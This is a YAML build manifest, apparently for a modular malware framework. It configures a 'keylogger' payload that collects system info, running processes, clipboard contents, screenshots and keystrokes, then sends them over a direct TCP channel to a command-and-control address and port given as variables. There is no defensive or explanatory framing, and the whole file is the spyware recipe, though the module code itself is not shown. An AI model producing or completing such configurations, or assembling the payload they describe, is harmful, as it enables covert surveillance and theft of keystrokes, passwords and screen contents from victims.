name: keylogger
description: Keylogger with system info, clipboard, screenshot, and keystroke capture

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/clipboard
  - collectors/screenshot
  - collectors/keylogger

exfil: exfil/tcp_direct
arch: arch/sequential

evasion: []

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  KEYLOG_DURATION_MS: "30000"
